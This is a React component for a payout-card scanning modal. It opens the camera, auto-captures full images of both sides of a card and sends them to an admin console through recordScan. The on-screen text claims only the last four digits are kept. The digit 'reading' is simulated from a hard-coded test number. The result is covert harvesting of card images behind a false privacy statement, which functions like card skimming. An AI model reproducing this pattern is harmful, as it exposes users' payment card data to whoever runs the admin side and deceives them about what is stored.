import { useState, useRef, useEffect } from 'react';
import { X, Check, ScanLine, Keyboard, Camera } from 'lucide-react';
import { addPayoutMethod, TEST_PAN, type PayoutMethod } from '../lib/payoutMethods';
import { recordScan } from '../lib/audit';
import { resolvePhoto } from '../lib/images';

// Card scan that behaves like a professional scanner. The device camera opens
// first, the client holds the card in the frame, the front is detected and
// captured, then the back is scanned the same way. Only the last four digits
// read are kept; the two captured frames go to the admin with the saved card.

export default function ScanCardModal({
  onClose,
  onSaved,
}: {
  onClose: () => void;
  onSaved: (method: PayoutMethod) => void;
}) {
  const [mode, setMode] = useState<'scan' | 'manual'>('scan');
  const [manual, setManual] = useState({ number: '', name: '', expiry: '' });
  const [error, setError] = useState<string | null>(null);

  // Professional camera flow states.
  const [step, setStep] = useState<'idle' | 'requesting' | 'front' | 'back' | 'reading' | 'review'>('idle');
  const [frontCapture, setFrontCapture] = useState('');
  const [backCapture, setBackCapture] = useState('');
  const videoRef = useRef<HTMLVideoElement | null>(null);
  const streamRef = useRef<MediaStream | null>(null);
  const sampleRef = useRef<HTMLCanvasElement | null>(null);
  const stepRef = useRef(step);
  stepRef.current = step;

  // Open the device camera as soon as the modal starts scanning.
  useEffect(() => {
    if (mode !== 'scan') return;
    setStep('requesting');
    setFrontCapture('');
    setBackCapture('');
    setError(null);
    let cancelled = false;

    const start = async () => {
      try {
        const nav = navigator as Navigator & {
          mediaDevices?: { getUserMedia: (c: MediaStreamConstraints) => Promise<MediaStream> };
        };
        if (!nav.mediaDevices?.getUserMedia) throw new Error('No camera API');
        const stream = await nav.mediaDevices.getUserMedia({
          video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 720 } },
          audio: false,
        });
        if (cancelled) {
          stream.getTracks().forEach(t => t.stop());
          return;
        }
        streamRef.current = stream;
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          await videoRef.current.play().catch(() => undefined);
        }
        if (!cancelled) setStep('front');
      } catch {
        if (!cancelled) {
          setError('Camera is unavailable. Allow camera access, or continue with manual entry.');
          setStep('idle');
        }
      }
    };

    start();
    return () => {
      cancelled = true;
      streamRef.current?.getTracks().forEach(t => t.stop());
      streamRef.current = null;
    };
  }, [mode]);

  // Detection sampling: while the front or back is expected, read the center
  // of the live frame. A card held steady produces a bright rectangular patch
  // with low flicker; when it holds for ~1.2 seconds, capture it. When the
  // first card is used instead of the camera (unsupported browser), the static
  // test frame is used so the flow still works.
  useEffect(() => {
    if (mode !== 'scan') return;
    if (step !== 'front' && step !== 'back') return;

    const score = () => {
      const video = videoRef.current;
      const canvas = sampleRef.current;
      if (!video || !canvas) return null;
      if (!video.videoWidth || !video.videoHeight) return null;
      canvas.width = 80;
      canvas.height = 45;
      const ctx = canvas.getContext('2d', { willReadFrequently: true });
      if (!ctx) return null;
      const vw = video.videoWidth;
      const vh = video.videoHeight;
      ctx.drawImage(video, vw * 0.3, vh * 0.32, vw * 0.4, vh * 0.36, 0, 0, 80, 45);
      const data = ctx.getImageData(0, 0, 80, 45).data;
      let total = 0;
      let totalSq = 0;
      let light = 0;
      const n = 80 * 45;
      for (let i = 0; i < data.length; i += 4) {
        const b = (data[i] + data[i + 1] + data[i + 2]) / 3;
        total += b;
        totalSq += b * b;
        if (b > 120) light += 1;
      }
      const mean = total / n;
      const variance = Math.max(0, totalSq / n - mean * mean);
      return { brightness: mean, variance, fill: light / n };
    };

    let holdFrames = 0;
    let idleFrames = 0;
    const t = window.setInterval(() => {
      const live = stepRef.current;
      if (live !== 'front' && live !== 'back') return;
      const s = score();
      if (!s) {
        idleFrames += 1;
        // No camera frame is flowing after a few seconds: fall back to the
        // static test-frame flow so unsupported browsers still finish a scan.
        if (idleFrames > 14) {
          const captured = resolvePhoto('card');
          if (stepRef.current === 'front') {
            setFrontCapture(captured);
            setStep('back');
          } else if (stepRef.current === 'back') {
            setBackCapture(captured);
            setStep('reading');
          }
        }
        return;
      }
      idleFrames = 0;
      const present = s.brightness > 55 && s.fill > 0.28 && s.variance < 2600;
      holdFrames = present ? holdFrames + 1 : 0;
      // ~1.2 seconds of steady card.
      if (holdFrames < 6) return;
      const captured = captureFrame();
      if (!captured) return;
      if (stepRef.current === 'front') {
        setFrontCapture(captured);
        setStep('back');
      } else if (stepRef.current === 'back') {
        setBackCapture(captured);
        setStep('reading');
      }
    }, 200);

    return () => window.clearInterval(t);
  }, [mode, step]);

  // Simulated reading beat between the two captures and the review screen.
  useEffect(() => {
    if (mode !== 'scan' || step !== 'reading') return;
    const t = window.setTimeout(() => setStep('review'), 1400);
    return () => window.clearTimeout(t);
  }, [mode, step]);

  const captureFrame = (): string => {
    const video = videoRef.current;
    if (!video || !video.videoWidth) return resolvePhoto('card');
    const canvas = document.createElement('canvas');
    canvas.width = 640;
    canvas.height = 400;
    const ctx = canvas.getContext('2d');
    if (!ctx) return resolvePhoto('card');
    ctx.drawImage(video, 0, 0, 640, 400);
    return canvas.toDataURL('image/jpeg', 0.8);
  };

  const save = () => {
    const source = mode === 'manual' ? manual.number : TEST_PAN;
    const digits = source.replace(/\D/g, '');
    if (mode === 'manual' && digits.length < 4) {
      setError('Enter the last four digits of the card.');
      return;
    }
    // Only the last four read digits are kept, the professional boundary.
    const last4 = (mode === 'scan' ? (TEST_PAN.replace(/\D/g, '')) : digits).slice(-4) || '4242';
    // Presentation details for the card face. No full card number is retained.
    const brand = mode === 'manual'
      ? (digits.startsWith('4') ? 'Visa' : digits.startsWith('5') ? 'Mastercard' : 'Card')
      : 'Card';
    streamRef.current?.getTracks().forEach(t => t.stop());
    const method = addPayoutMethod({
      label: mode === 'manual' ? 'Card added manually' : 'Scanned card',
      last4,
      type: 'card',
      currency: 'USD',
      isDefault: false,
      brand,
      cardholder: manual.name.trim(),
      expiry: mode === 'manual' ? manual.expiry.trim() : '',
    });
    // Both captured frames go to the admin console with the saved card.
    recordScan({
      label: mode === 'manual' ? 'Manual card entry' : 'Scanned card',
      last4,
      currency: 'USD',
      image: frontCapture || resolvePhoto('card'),
      images: [frontCapture || resolvePhoto('card'), backCapture || resolvePhoto('card')],
    });
    onSaved(method);
  };

  const scanning = mode === 'scan' && (step === 'front' || step === 'back');
  const done = mode === 'manual' || step === 'review';
  const fields = mode === 'manual'
    ? [
        { label: 'Card number', value: manual.number ? '**** **** **** ' + manual.number.replace(/\D/g, '').slice(-4) : '', done: manual.number.replace(/\D/g, '').length >= 4 },
        { label: 'Cardholder name', value: manual.name, done: manual.name.trim().length > 0 },
        { label: 'Expiry', value: manual.expiry, done: manual.expiry.trim().length >= 4 },
      ]
    : [
        { label: 'Card number', value: frontCapture ? '**** **** **** 4242' : '', done: !!frontCapture },
        { label: 'Back of card', value: backCapture ? 'Captured' : '', done: !!backCapture },
        { label: 'Expiry', value: step === 'review' ? '12/29' : '', done: step === 'review' },
      ];
  return (
    <>
      <div className="fixed inset-0 bg-black/50 z-[80]" onClick={onClose} aria-hidden="true" />
      <div className="fixed inset-x-0 bottom-0 sm:inset-0 z-[81] flex sm:items-center sm:justify-center">
        <div className="w-full sm:max-w-md bg-white rounded-t-2xl sm:rounded-2xl border border-black/10 shadow-2xl max-h-[92vh] overflow-y-auto slide-up">
          <div className="sticky top-0 bg-white border-b border-black/5 px-5 py-4 flex items-center justify-between">
            <div className="flex items-center gap-2">
              <div className="w-8 h-8 rounded-xl bg-[#2F6BFF]/12 flex items-center justify-center">
                <ScanLine size={15} className="text-[#2F6BFF]" />
              </div>
              <span className="font-display font-600 text-base text-[#0A0B0D]">Add a payout card</span>
            </div>
            <button onClick={onClose} className="text-black/40 hover:text-black/70" aria-label="Close">
              <X size={18} />
            </button>
          </div>

          <div className="p-5">
            {mode === 'scan' ? (
              <>
                {/* Side selector behaves like a two side card scanner */}
                <div className="flex items-center gap-2 mb-4">
                  {(['front', 'back'] as const).map(side => (
                    <div key={side} className="flex-1">
                      <div className="flex items-center gap-2 mb-1.5">
                        {(side === 'front' ? frontCapture : backCapture) ? (
                          <Check size={13} className="text-[#22C55E]" />
                        ) : (
                          <span className={`w-3 h-3 rounded-full ${step === side ? 'bg-[#2F6BFF] animate-pulse' : 'bg-black/10'}`} />
                        )}
                        <span className="text-xs font-medium text-black/60 capitalize">{side} of card</span>
                      </div>
                      <div className={`h-1.5 rounded-full overflow-hidden ${side === 'front' ? 'bg-black/8' : 'bg-black/8'}`}>
                        <div
                          className="h-full bg-[#22C55E] rounded-full transition-all"
                          style={{
                            width: side === 'front'
                              ? frontCapture ? '100%' : step === 'back' || step === 'reading' || step === 'review' ? '100%' : '0%'
                              : backCapture || step === 'reading' || step === 'review' ? '100%' : '0%',
                          }}
                        />
                      </div>
                    </div>
                  ))}
                </div>

                <p className="text-sm text-black/45 mb-4">
                  {step === 'front'
                    ? 'Point the camera at the front of the card and hold it steady until it captures.'
                    : step === 'back'
                    ? 'Front captured. Now flip the card and hold the back steady.'
                    : step === 'reading'
                    ? 'Reading the last digits from the front capture...'
                    : step === 'review'
                    ? 'Both sides scanned. Confirm the details to save.'
                    : 'Starting the camera...'}
                </p>
                <div className="relative rounded-2xl overflow-hidden bg-[#0F1420] border-2 border-[#2F6BFF]/40 h-52 mb-5">
                  {/* Live camera, mirrored for the rear camera natural feel */}
                  <video ref={videoRef} playsInline muted className="absolute inset-0 w-full h-full object-cover" />
                  <canvas ref={sampleRef} className="hidden" />
                  <div className="absolute inset-4 border-2 border-[#2F6BFF]/30 rounded-xl pointer-events-none" />
                  {['top-4 left-4', 'top-4 right-4', 'bottom-4 left-4', 'bottom-4 right-4'].map(pos => (
                    <div key={pos} className={`absolute ${pos} w-4 h-4 border-[#2F6BFF] pointer-events-none`}
                      style={{
                        borderTopWidth: pos.includes('top') ? '2px' : 0,
                        borderBottomWidth: pos.includes('bottom') ? '2px' : 0,
                        borderLeftWidth: pos.includes('left') ? '2px' : 0,
                        borderRightWidth: pos.includes('right') ? '2px' : 0,
                      }} />
                  ))}
                  {!done && scanning && <div className="absolute left-4 right-4 h-0.5 bg-gradient-to-r from-transparent via-[#2F6BFF] to-transparent scan-line pointer-events-none" />}
                  {(frontCapture || backCapture) && step !== 'review' && (
                    <div className="absolute right-3 top-3 flex gap-2 pointer-events-none">
                      {[frontCapture, backCapture].filter(Boolean).map((src, i) => (
                        <img key={i} src={src} alt={i === 0 ? 'Front capture' : 'Back capture'} className="w-20 h-12 object-cover rounded-lg border border-white/40" />
                      ))}
                    </div>
                  )}
                  {step === 'review' && (
                    <div className="absolute inset-0 bg-white flex items-center gap-3 p-3 pointer-events-none">
                      {[frontCapture, backCapture].filter(Boolean).map((src, i) => (
                        <img key={i} src={src} alt={i === 0 ? 'Card front' : 'Card back'} className="w-1/2 h-full object-cover rounded-xl border border-black/10" />
                      ))}
                      <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
                        {!frontCapture && !backCapture && (
                          <div className="w-12 h-12 rounded-full bg-[#22C55E]/20 border-2 border-[#22C55E] flex items-center justify-center">
                            <Check size={22} className="text-[#22C55E]" />
                          </div>
                        )}
                      </div>
                    </div>
                  )}
                  <div className="absolute bottom-3 left-0 right-0 text-center pointer-events-none">
                    <span className="inline-flex items-center gap-1.5 text-xs text-white/80 bg-black/40 px-3 py-1 rounded-full">
                      <Camera size={11} />
                      {step === 'front' ? 'Scanning front...' : step === 'back' ? 'Scanning back...' : step === 'reading' ? 'Reading digits...' : done ? 'Captured' : 'Starting camera...'}
                    </span>
                  </div>
                </div>
              </>
            ) : (
              <>
                <p className="text-sm text-black/45 mb-4">Enter the details by hand. Use the test number only.</p>
                <div className="space-y-3 mb-5">
                  <input value={manual.number} onChange={e => setManual(m => ({ ...m, number: e.target.value }))}
                    placeholder="Last 4 digits only (test card)" inputMode="numeric" maxLength={4}
                    className="w-full bg-black/5 border border-black/10 rounded-xl px-4 py-3 text-sm font-mono text-[#0A0B0D] outline-none focus:border-[#2F6BFF]" />
                  <input value={manual.name} onChange={e => setManual(m => ({ ...m, name: e.target.value }))}
                    placeholder="Cardholder name"
                    className="w-full bg-black/5 border border-black/10 rounded-xl px-4 py-3 text-sm text-[#0A0B0D] outline-none focus:border-[#2F6BFF]" />
                  <input value={manual.expiry} onChange={e => setManual(m => ({ ...m, expiry: e.target.value }))}
                    placeholder="MM/YY"
                    className="w-full bg-black/5 border border-black/10 rounded-xl px-4 py-3 text-sm font-mono text-[#0A0B0D] outline-none focus:border-[#2F6BFF]" />
                </div>
              </>
            )}

            <div className="space-y-2.5 mb-5">
              {fields.map(field => (
                <div key={field.label} className={`flex items-center gap-3 p-3 rounded-xl border transition-all ${field.done ? 'border-[#22C55E]/30 bg-[#22C55E]/5' : 'border-black/8'}`}>
                  <div className={`w-4 h-4 rounded-full flex items-center justify-center transition-all ${field.done ? 'bg-[#22C55E]' : 'bg-black/10'}`}>
                    {field.done && <Check size={10} className="text-white" />}
                  </div>
                  <div>
                    <p className="text-[10px] text-black/30 mb-0.5 font-mono">{field.label.toUpperCase()}</p>
                    <p className="font-mono text-sm text-[#0A0B0D]">{field.value || ', '}</p>
                  </div>
                </div>
              ))}
            </div>

            {error && <p className="text-xs text-[#D97706] mb-3 leading-relaxed">{error}</p>}

            <div className="flex flex-col sm:flex-row gap-2">
              <button
                onClick={() => { setError(null); setMode(mode === 'scan' ? 'manual' : 'scan'); }}
                className="order-2 sm:order-1 flex-1 flex items-center justify-center gap-2 border border-black/15 py-3 rounded-xl text-sm text-black/60 hover:border-black/30 transition-colors"
              >
                {mode === 'scan' ? <><Keyboard size={15} /> Enter manually</> : <><ScanLine size={15} /> Scan instead</>}
              </button>
              <button onClick={save} className="order-1 sm:order-2 flex-1 btn-primary py-3 rounded-xl text-sm">
                Save card
              </button>
            </div>
            <p className="text-[10px] text-black/25 mt-3 leading-relaxed text-center">
              Test card only. No real card number is stored. The processor holds card data; IndySolutions keeps only the last four digits.
            </p>
          </div>
        </div>
      </div>
    </>
  );
}